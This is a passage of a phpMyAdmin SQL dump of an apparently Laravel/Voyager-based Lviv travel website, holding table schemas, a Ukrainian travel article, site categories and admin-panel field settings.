-- phpMyAdmin SQL Dump
-- version 4.5.4.1deb2ubuntu2
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Время создания: Июн 18 2018 г., 13:43
-- Версия сервера: 10.0.34-MariaDB-0ubuntu0.16.04.1
-- Версия PHP: 7.0.30-1+ubuntu16.04.1+deb.sury.org+1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- База данных: `lvic-travel`
--

-- --------------------------------------------------------

--
-- Структура таблицы `around_lvivs`
--

CREATE TABLE `around_lvivs` (
  `id` int(11) NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_uk` text NOT NULL,
  `name_en` text NOT NULL,
  `slug` text NOT NULL,
  `address_uk` text NOT NULL,
  `address_en` text NOT NULL,
  `title_uk` text NOT NULL,
  `title_en` text NOT NULL,
  `post_uk` text NOT NULL,
  `post_en` text NOT NULL,
  `banner_photo` text NOT NULL,
  `photo1` text NOT NULL,
  `photo2` text,
  `photo3` text,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Дамп данных таблицы `around_lvivs`
--

INSERT INTO `around_lvivs` (`id`, `tag`, `name_uk`, `name_en`, `slug`, `address_uk`, `address_en`, `title_uk`, `title_en`, `post_uk`, `post_en`, `banner_photo`, `photo1`, `photo2`, `photo3`, `created_at`, `updated_at`) VALUES
(1, '', 'Старий Самбір та села Розлуч і Скелівка', '0', 'starij-sambir-ta-sela-rozluch-i-skelivka', 'cело Скелевка., Львовская область', '0', 'Одне з найцікавіших містечок на Прикарпатті – Старий Самбір. Маленьке, тихе, спокійне. До гір тут зовсім недалеко, врешті, Старосамбірський район вже має статус гірського.', 'ones of interests', '<p><span style="color: #1d1d1d; font-family: Helvetica, sans-serif;">Свого часу такі містечка були осередками єврейського життя в Галичині, оскільки значна частина їх мешканців, або й навіть більшість, становили євреї. Зараз від того минулого залишились лише окремі пам&rsquo;ятки, як от старосамбірська синагога та єврейський цвинтар. Між іншим, один з найстаріших в Україні, адже ховали тут ще у 16 столітті. Якщо ви хочете трохи затриматись у цих краях, то зупинитись краще не в самому містечку, а в селі Розлуч.</span><br style="color: #1d1d1d; font-family: Helvetica, sans-serif;" /><br style="color: #1d1d1d; font-family: Helvetica, sans-serif;" /><span style="color: #1d1d1d; font-family: Helvetica, sans-serif;">Як бонус, матимете чудове повітря і карпатську природу плюс джерела мінеральної воли &laquo;Нафтуся&raquo;, &laquo;Залізна&raquo; та &laquo;Содова&raquo;. При базах є і кухні. А вже наступного дня, попивши мінеральної водички, можна вирушити в село Скелівку (колишній Фельштин). У селі зберігся костел святого Мартина з оборонною баштою-дзвіницею, однак головна принада села все ж не він. Село згадується у романі чеського письменника Ярослава Гашека &laquo;Пригоди бравого вояка Швейка&raquo;. Звісно, у селі є і пам&rsquo;ятник славному вояку.</span></p>', '0', 'around-lvivs/May2018/k969GXmZd2t3VFUDHWPc.jpg', 'around-lvivs/May2018/HJFsGjSzpServVf2i5up.jpeg', 'around-lvivs/May2018/31xMBoy1nMFBoVGMjm3m.jpg', 'around-lvivs/May2018/zm0MHGDdsi3unYlkVbaV.jpeg', '2018-05-14 06:27:00', '2018-05-15 10:05:33');

-- --------------------------------------------------------

--
-- Структура таблицы `categories`
--

CREATE TABLE `categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `order` int(11) NOT NULL DEFAULT '1',
  `is_tag` int(1) NOT NULL DEFAULT '0',
  `name_uk` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_en` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `categories`
--

INSERT INTO `categories` (`id`, `order`, `is_tag`, `name_uk`, `name_en`, `slug`, `created_at`, `updated_at`) VALUES
(1, 1, 0, 'Музеї', 'Museums', 'museums', '2018-05-24 10:12:30', '2018-05-24 10:12:30'),
(2, 1, 0, 'Єкскурсія', 'Excursions', 'excursions', '2018-05-24 10:45:50', '2018-05-24 10:45:50'),
(3, 1, 0, 'Концерт', 'Concert', 'concerts', '2018-05-29 11:14:10', '2018-05-29 11:14:10'),
(4, 1, 0, 'Їжа та напої', 'Food & drinks', 'fooddrinks', '2018-05-29 11:22:31', '2018-05-29 11:22:31'),
(5, 1, 0, 'Театри', 'Theatres', 'theatres', '2018-05-29 11:24:47', '2018-05-29 11:26:26'),
(6, 1, 0, 'Громадські місця', 'Public places', 'publicplaces', '2018-05-29 11:57:49', '2018-05-31 08:00:38'),
(7, 1, 0, 'Парки', 'Parks', 'parks', '2018-05-29 12:02:13', '2018-05-29 12:02:13'),
(8, 1, 0, 'Пам\'ятки', 'Memories', 'memories', '2018-05-31 05:29:39', '2018-05-31 05:29:39'),
(9, 1, 0, 'Конференції', 'Conferentions', 'conferentions', '2018-06-01 05:41:10', '2018-06-01 05:41:10'),
(10, 1, 0, 'Спорт', 'Sport', 'sports', '2018-06-01 05:41:31', '2018-06-01 05:41:31'),
(11, 1, 0, 'Для дітей', 'For children', 'forchildrens', '2018-06-01 05:42:17', '2018-06-01 05:42:17'),
(12, 1, 0, 'Фестивалі', 'Festivals', 'festivals', '2018-06-01 05:43:02', '2018-06-01 05:43:02'),
(13, 1, 0, 'Мистецтво та культура', 'Art and culture', 'artandcultures', '2018-06-01 05:44:55', '2018-06-01 05:44:55'),
(14, 1, 0, 'Тури містом', 'City tours', 'citytours', '2018-06-01 05:48:49', '2018-06-01 05:48:49'),
(15, 1, 0, 'Путівника та карти', 'Guidebooks and maps', 'guidebooksmaps', '2018-06-01 05:51:16', '2018-06-01 05:51:16'),
(16, 1, 0, 'Аттракції', 'Attractions', 'attractions', '2018-06-01 05:52:43', '2018-06-01 05:52:43'),
(17, 1, 0, 'Галереї', 'Galleries', 'galleries', '2018-06-01 05:53:24', '2018-06-01 05:53:24'),
(18, 1, 0, 'Унікальні заклади', 'Unique establishments', 'uniqueestablishments', '2018-06-01 05:54:29', '2018-06-01 05:54:29'),
(19, 1, 0, 'Як дістатись до Львова', 'How to get to Lviv', 'howgetlvivs', '2018-06-01 05:57:23', '2018-06-01 05:57:23'),
(20, 1, 0, 'Таксі', 'Taxi', 'taxis', '2018-06-01 05:58:13', '2018-06-01 05:58:13'),
(21, 1, 0, 'Публічний транспорт', 'Public transport', 'publictransports', '2018-06-01 05:59:18', '2018-06-01 05:59:18'),
(22, 1, 0, 'Велопрокат', 'Bicycle rental', 'bicyclerentals', '2018-06-01 06:00:43', '2018-06-01 06:00:43'),
(23, 1, 0, 'Готелі', 'Hotels', 'hotels', '2018-06-01 06:01:54', '2018-06-01 06:01:54'),
(24, 1, 0, 'Бізнес', 'Businnes', 'businnes', '2018-06-01 06:05:09', '2018-06-01 06:05:09');

-- --------------------------------------------------------

--
-- Структура таблицы `data_rows`
--

CREATE TABLE `data_rows` (
  `id` int(10) UNSIGNED NOT NULL,
  `data_type_id` int(10) UNSIGNED NOT NULL,
  `field` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `required` tinyint(1) NOT NULL DEFAULT '0',
  `browse` tinyint(1) NOT NULL DEFAULT '1',
  `read` tinyint(1) NOT NULL DEFAULT '1',
  `edit` tinyint(1) NOT NULL DEFAULT '1',
  `add` tinyint(1) NOT NULL DEFAULT '1',
  `delete` tinyint(1) NOT NULL DEFAULT '1',
  `details` text COLLATE utf8mb4_unicode_ci,
  `order` int(11) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `data_rows`
--

INSERT INTO `data_rows` (`id`, `data_type_id`, `field`, `type`, `display_name`, `required`, `browse`, `read`, `edit`, `add`, `delete`, `details`, `order`) VALUES
(1, 1, 'id', 'number', 'ID', 1, 0, 0, 0, 0, 0, NULL, 1),
(2, 1, 'author_id', 'text', 'Author', 1, 0, 1, 1, 0, 1, NULL, 2),
(3, 1, 'category_id', 'text', 'Category', 0, 0, 1, 1, 1, 0, NULL, 3),
(5, 1, 'excerpt', 'text_area', 'excerpt', 0, 0, 1, 1, 1, 1, NULL, 5),
(6, 1, 'body', 'rich_text_box', 'Body', 1, 0, 1, 1, 1, 1, NULL, 6),
(7, 1, 'image', 'image', 'Post Image', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 7),
(8, 1, 'slug', 'text', 'slug', 1, 0, 1, 1, 1, 1, '{"slugify":{"origin":"title","forceUpdate":true}}', 8),
(9, 1, 'meta_description', 'text_area', 'meta_description', 0, 0, 1, 1, 1, 1, NULL, 9),
(10, 1, 'meta_keywords', 'text_area', 'meta_keywords', 0, 0, 1, 1, 1, 1, NULL, 10),
(11, 1, 'status', 'select_dropdown', 'status', 1, 1, 1, 1, 1, 1, '{"default":"DRAFT","options":{"PUBLISHED":"published","DRAFT":"draft","PENDING":"pending"}}', 11),
(12, 1, 'created_at', 'timestamp', 'created_at', 0, 1, 1, 0, 0, 0, NULL, 12),
(13, 1, 'updated_at', 'timestamp', 'updated_at', 0, 0, 0, 0, 0, 0, NULL, 13),
(14, 2, 'id', 'number', 'id', 1, 0, 0, 0, 0, 0, '', 1),
(15, 2, 'author_id', 'text', 'author_id', 1, 0, 0, 0, 0, 0, '', 2),
(17, 2, 'excerpt', 'text_area', 'excerpt', 1, 0, 1, 1, 1, 1, '', 4),
(18, 2, 'body', 'rich_text_box', 'body', 1, 0, 1, 1, 1, 1, '', 5),
(19, 2, 'slug', 'text', 'slug', 1, 0, 1, 1, 1, 1, '{"slugify":{"origin":"title"}}', 6),
(20, 2, 'meta_description', 'text', 'meta_description', 1, 0, 1, 1, 1, 1, '', 7),
(21, 2, 'meta_keywords', 'text', 'meta_keywords', 1, 0, 1, 1, 1, 1, '', 8),
(22, 2, 'status', 'select_dropdown', 'status', 1, 1, 1, 1, 1, 1, '{"default":"INACTIVE","options":{"INACTIVE":"INACTIVE","ACTIVE":"ACTIVE"}}', 9),
(23, 2, 'created_at', 'timestamp', 'created_at', 1, 1, 1, 0, 0, 0, '', 10),
(24, 2, 'updated_at', 'timestamp', 'updated_at', 1, 0, 0, 0, 0, 0, '', 11),
(25, 2, 'image', 'image', 'image', 0, 1, 1, 1, 1, 1, '', 12),
(26, 3, 'id', 'number', 'id', 1, 0, 0, 0, 0, 0, NULL, 1),
(27, 3, 'name', 'text', 'name', 1, 1, 1, 1, 1, 1, NULL, 2),
(28, 3, 'email', 'text', 'email', 1, 1, 1, 1, 1, 1, NULL, 3),
(29, 3, 'password', 'password', 'password', 1, 0, 0, 1, 1, 0, NULL, 4),
(30, 3, 'user_belongsto_role_relationship', 'relationship', 'Role', 0, 1, 1, 1, 1, 0, '{"model":"TCG\\\\Voyager\\\\Models\\\\Role","table":"roles","type":"belongsTo","column":"role_id","key":"id","label":"name","pivot_table":"roles","pivot":"0"}', 10),
(31, 3, 'remember_token', 'text', 'remember_token', 0, 0, 0, 0, 0, 0, NULL, 5),
(32, 3, 'created_at', 'timestamp', 'created_at', 0, 1, 1, 0, 0, 0, NULL, 6),
(33, 3, 'updated_at', 'timestamp', 'updated_at', 0, 0, 0, 0, 0, 0, NULL, 7),
(34, 3, 'avatar', 'image', 'avatar', 0, 0, 0, 0, 0, 0, NULL, 8),
(35, 5, 'id', 'number', 'id', 1, 0, 0, 0, 0, 0, '', 1),
(36, 5, 'name', 'text', 'name', 1, 1, 1, 1, 1, 1, '', 2),
(37, 5, 'created_at', 'timestamp', 'created_at', 0, 0, 0, 0, 0, 0, '', 3),
(38, 5, 'updated_at', 'timestamp', 'updated_at', 0, 0, 0, 0, 0, 0, '', 4),
(39, 4, 'id', 'number', 'id', 1, 0, 0, 0, 0, 0, NULL, 1),
(41, 4, 'order', 'hidden', 'order', 1, 1, 1, 1, 1, 1, '{"default":1}', 3),
(42, 4, 'name', 'hidden', 'name', 1, 1, 1, 1, 1, 1, NULL, 4),
(43, 4, 'slug', 'text', 'Слаг \\ Тег', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name"}}', 5),
(44, 4, 'created_at', 'timestamp', 'created_at', 0, 0, 1, 0, 0, 0, NULL, 6),
(45, 4, 'updated_at', 'timestamp', 'updated_at', 0, 0, 0, 0, 0, 0, NULL, 7),
(46, 6, 'id', 'number', 'id', 1, 0, 0, 0, 0, 0, '', 1),
(47, 6, 'name', 'text', 'Name', 1, 1, 1, 1, 1, 1, '', 2),
(48, 6, 'created_at', 'timestamp', 'created_at', 0, 0, 0, 0, 0, 0, '', 3),
(49, 6, 'updated_at', 'timestamp', 'updated_at', 0, 0, 0, 0, 0, 0, '', 4),
(50, 6, 'display_name', 'text', 'Display Name', 1, 1, 1, 1, 1, 1, '', 5),
(51, 1, 'seo_title', 'text', 'seo_title', 0, 1, 1, 1, 1, 1, NULL, 14),
(52, 1, 'featured', 'checkbox', 'featured', 1, 1, 1, 1, 1, 1, NULL, 15),
(53, 3, 'role_id', 'text', 'role_id', 0, 1, 1, 1, 1, 1, NULL, 9),
(54, 1, 'image1', 'image', 'Image1', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 9),
(64, 8, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(65, 8, 'code', 'text', 'Код', 1, 1, 1, 1, 1, 1, NULL, 2),
(66, 8, 'short_name', 'text', 'Коротке ім\'я', 1, 1, 1, 1, 1, 1, NULL, 3),
(67, 8, 'display_name', 'text', 'Назва', 1, 1, 1, 1, 1, 1, NULL, 4),
(68, 8, 'status', 'text', 'Опубліковано', 1, 1, 1, 1, 1, 1, NULL, 5),
(69, 9, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(70, 9, 'google_id', 'checkbox', 'Google Id', 1, 1, 1, 1, 1, 1, NULL, 2),
(71, 9, 'name_owner', 'checkbox', 'Name Owner', 1, 1, 1, 1, 1, 1, NULL, 3),
(72, 9, 'address', 'checkbox', 'Address', 1, 1, 1, 1, 1, 1, NULL, 4),
(73, 9, 'site', 'checkbox', 'Site', 1, 1, 1, 1, 1, 1, NULL, 5),
(74, 9, 'number', 'checkbox', 'Number', 1, 1, 1, 1, 1, 1, NULL, 6),
(75, 9, 'schedule', 'checkbox', 'Schedule', 1, 1, 1, 1, 1, 1, NULL, 7),
(76, 9, 'description', 'checkbox', 'Description', 1, 1, 1, 1, 1, 1, NULL, 8),
(77, 9, 'photo', 'checkbox', 'Photo', 1, 1, 1, 1, 1, 1, NULL, 9),
(78, 9, 'rating', 'checkbox', 'Rating', 1, 1, 1, 1, 1, 1, NULL, 10),
(79, 9, 'reviews', 'checkbox', 'Reviews', 1, 1, 1, 1, 1, 1, NULL, 11),
(80, 9, 'lat', 'checkbox', 'Lat', 1, 1, 1, 1, 1, 1, NULL, 12),
(81, 9, 'long', 'checkbox', 'Long', 1, 1, 1, 1, 1, 1, NULL, 13),
(82, 9, 'user_id', 'checkbox', 'User Id', 1, 1, 1, 1, 1, 1, NULL, 14),
(83, 9, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 15),
(84, 9, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 16),
(85, 2, 'page_hasone_gid_relationship', 'relationship', 'gids', 0, 1, 1, 1, 1, 1, '{"model":"App\\\\Gid","table":"gids","type":"hasOne","column":"id","key":"id","label":"id","pivot_table":"categories","pivot":"0"}', 13),
(86, 10, 'id', 'code_editor', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(87, 10, 'name', 'text', 'Ім\'я', 1, 1, 1, 1, 1, 1, NULL, 3),
(88, 10, 'email', 'text', 'Email', 1, 1, 1, 1, 1, 1, NULL, 5),
(89, 10, 'number', 'number', 'Тел:', 1, 1, 1, 1, 1, 1, NULL, 6),
(90, 10, 'number2', 'number', 'Тел2:', 1, 1, 1, 1, 1, 1, NULL, 7),
(92, 10, 'avatar', 'image', 'фото', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 10),
(93, 10, 'baner_photo', 'image', 'Банер  картинка', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 11),
(94, 10, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 0, 0, 0, NULL, 12),
(95, 10, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 13),
(96, 12, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(97, 12, 'gid_id', 'text', 'Gid Id', 1, 1, 1, 1, 1, 1, NULL, 2),
(100, 12, 'photo', 'image', 'Фото', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 9),
(101, 12, 'photo1', 'image', 'Фото2', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 10),
(102, 12, 'photo2', 'image', 'Фото3', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 11),
(103, 12, 'baner_photo', 'image', 'Банер картинка', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 12),
(105, 12, 'status', 'select_dropdown', 'Tip', 1, 1, 1, 1, 1, 1, '{"default":"DRAFT","options":{"PUBLISHED":"опубліковано","PENDING":"не опубліковане"}}', 6),
(106, 12, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 13),
(107, 12, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 14),
(126, 10, 'slug', 'text', 'Slug', 1, 0, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 4),
(127, 10, 'post', 'rich_text_box', 'Опис', 1, 1, 1, 1, 1, 1, NULL, 9),
(128, 12, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 4),
(134, 16, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(137, 16, 'banner_photo', 'image', 'Банер картинка', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 14),
(138, 16, 'created_at', 'timestamp', 'Created At', 0, 0, 0, 0, 0, 0, NULL, 18),
(139, 16, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 19),
(140, 16, 'name', 'text', 'Название', 1, 1, 1, 1, 1, 1, NULL, 3),
(142, 16, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 4),
(144, 16, 'address', 'text', 'Адреса', 1, 1, 1, 1, 1, 1, NULL, 5),
(145, 16, 'number', 'text', 'Тел:', 1, 1, 1, 1, 1, 1, NULL, 6),
(146, 16, 'number2', 'text', 'Тел2:', 1, 1, 1, 1, 1, 1, NULL, 7),
(147, 16, 'post', 'rich_text_box', 'Опис', 1, 1, 1, 1, 1, 1, NULL, 13),
(148, 16, 'cost', 'rich_text_box', 'Вартість', 0, 1, 1, 1, 1, 1, NULL, 10),
(149, 16, 'schedule', 'rich_text_box', 'Графік роботи', 1, 1, 1, 1, 1, 1, NULL, 11),
(150, 16, 'email', 'text', 'Email', 0, 1, 1, 1, 1, 1, NULL, 8),
(151, 16, 'site', 'text', 'Сайт', 0, 1, 1, 1, 1, 1, NULL, 9),
(152, 16, 'photo', 'image', 'Фото', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 15),
(153, 16, 'photo1', 'image', 'Фото2', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 16),
(154, 16, 'photo2', 'image', 'Фото3', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 17),
(156, 18, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 2),
(159, 18, 'banner_photo', 'image', 'Банер картинка', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 6),
(160, 18, 'photo1', 'image', 'Фото1', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 7),
(161, 18, 'photo2', 'image', 'Фото2', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 8),
(162, 18, 'photo3', 'image', 'Фото3', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 9),
(163, 18, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 10),
(164, 18, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 11),
(166, 19, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(167, 19, 'name', 'text', 'Название', 1, 1, 1, 1, 1, 1, NULL, 2),
(168, 19, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 3),
(169, 19, 'address', 'text', 'Адреса', 1, 1, 1, 1, 1, 1, NULL, 4),
(171, 19, 'post', 'rich_text_box', 'Опис', 1, 1, 1, 1, 1, 1, NULL, 6),
(172, 19, 'banner_photo', 'image', 'Banner Photo', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 7),
(173, 19, 'photo1', 'image', 'Photo1', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 8),
(174, 19, 'photo2', 'image', 'Photo2', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 9),
(175, 19, 'photo3', 'image', 'Photo3', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 10),
(176, 19, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 11),
(177, 19, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 12),
(178, 20, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(179, 20, 'name', 'text', 'Название', 1, 1, 1, 1, 1, 1, NULL, 2),
(180, 20, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 3),
(181, 20, 'address', 'text', 'Адреса', 1, 1, 1, 1, 1, 1, NULL, 4),
(182, 20, 'title', 'text', 'Короткий опис', 1, 1, 1, 1, 1, 1, NULL, 5),
(183, 20, 'post', 'rich_text_box', 'Опис', 1, 1, 1, 1, 1, 1, NULL, 6),
(184, 20, 'banner_photo', 'image', 'Банер картинка', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 7),
(185, 20, 'photo1', 'image', 'Фото1', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 8),
(186, 20, 'photo2', 'image', 'Фото2', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 9),
(187, 20, 'photo3', 'image', 'Фото3', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 10),
(188, 20, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 11),
(189, 20, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 12),
(209, 22, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, '{"slugify":{"origin":"name","forceUpdate":true}}', 2),
(212, 22, 'banner_photo', 'image', 'Banner Photo', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 5),
(213, 22, 'photo1', 'image', 'Photo1', 1, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 6),
(214, 22, 'photo2', 'image', 'Photo2', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 7),
(215, 22, 'photo3', 'image', 'Photo3', 0, 1, 1, 1, 1, 1, '{"resize":{"width":"1000","height":"null"},"quality":"70%","upsize":true,"thumbnails":[{"name":"medium","scale":"50%"},{"name":"small","scale":"25%"},{"name":"cropped","crop":{"width":"300","height":"250"}}]}', 8),
(216, 22, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 9),
(219, 22, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 11),
(220, 8, 'created_at', 'timestamp', 'Створено', 0, 1, 1, 1, 0, 0, NULL, 6),
(221, 8, 'updated_at', 'timestamp', 'Редакція', 0, 1, 1, 1, 0, 0, NULL, 7),
(260, 31, 'id', 'hidden', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
